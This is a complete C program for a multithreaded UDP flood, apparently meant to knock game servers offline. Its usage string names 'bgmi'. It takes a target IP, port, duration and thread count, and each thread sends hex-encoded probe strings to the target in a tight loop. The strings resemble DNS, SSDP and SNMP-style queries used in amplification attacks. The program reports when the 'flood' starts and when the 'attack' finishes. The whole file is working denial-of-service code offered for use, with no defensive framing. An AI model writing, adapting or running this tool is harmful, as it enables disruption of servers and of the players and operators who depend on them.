#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

void usage() {
    printf("Usage: ./bgmi ip port time threads\n");
    exit(1);
}

struct thread_data {
    char ip[INET_ADDRSTRLEN];
    int port;
    int time;
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;
    const char *payloads[] = {
        "\x77\x77\x77\x2e\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\x00",
        "\x53\x4e\x51\x55\x45\x52\x59\x3a\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x00",
        "\x4d\x2d\x53\x45\x41\x52\x43\x48\x20\x2a\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x00"
    };

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    if (inet_pton(AF_INET, data->ip, &server_addr.sin_addr) <= 0) {
        perror("Invalid IP address");
        close(sock);
        pthread_exit(NULL);
    }

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime) {
        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
            if (sendto(sock, payloads[i], strlen(payloads[i]), 0,
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = atoi(argv[4]);

    if (port <= 0 || port > 65535) {
        fprintf(stderr, "Invalid port number. Must be between 1 and 65535.\n");
        exit(1);
    }

    if (time <= 0 || threads <= 0) {
        fprintf(stderr, "Time and threads must be positive integers.\n");
        exit(1);
    }

    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    if (!thread_ids) {
        perror("Memory allocation failed");
        exit(1);
    }

    printf("Flood started on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);

    for (int i = 0; i < threads; i++) {
        struct thread_data *data = malloc(sizeof(struct thread_data));
        if (!data) {
            perror("Memory allocation failed");
            free(thread_ids);
            exit(1);
        }
        strncpy(data->ip, ip, INET_ADDRSTRLEN);
        data->port = port;
        data->time = time;

        if (pthread_create(&thread_ids[i], NULL, attack, (void *)data) != 0) {
            perror("Thread creation failed");
            free(data);
            free(thread_ids);
            exit(1);
        }
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("Attack finished\n");
    return 0;
}
